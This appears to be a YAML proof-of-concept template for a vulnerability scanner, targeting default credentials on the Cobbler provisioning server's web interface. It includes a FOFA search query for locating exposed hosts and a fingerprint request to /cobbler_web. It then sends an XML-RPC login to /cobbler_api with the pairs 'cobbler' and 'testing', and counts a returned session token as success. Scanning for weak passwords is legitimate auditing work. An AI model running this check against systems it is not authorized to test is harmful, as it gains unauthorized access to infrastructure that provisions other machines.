id: poc-yaml-cobbler-weak-password
info:
  name: cobbler 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: cobbler
  fofa: body="Cobbler Web Interface"
variables:
  users: 'cobbler

    testing

    '
  password: 'cobbler

    testing

    '
firstRequest:
  method: GET
  path: /cobbler_web
  expression: contains(body,"Cobbler Web Interface")
requests:
- method: POST
  path: /cobbler_api
  headers:
    Content-Type: text/xml
  data: "<?xml version='1.0'?>\n<methodCall>\n  <methodName>login</methodName>\n \
    \ <params>\n    <param>\n      <value>\n        <string>{{.users}}</string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string>{{.password}}</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>"
  expression: status_code == 200 && !contains(body,"<name>faultCode</name>") && !contains(body,"login
    failed") && contains(content_type,"text/xml") && matches(body,`(.*[a-zA-Z0-9].+==)</string></value>`)
transport: http
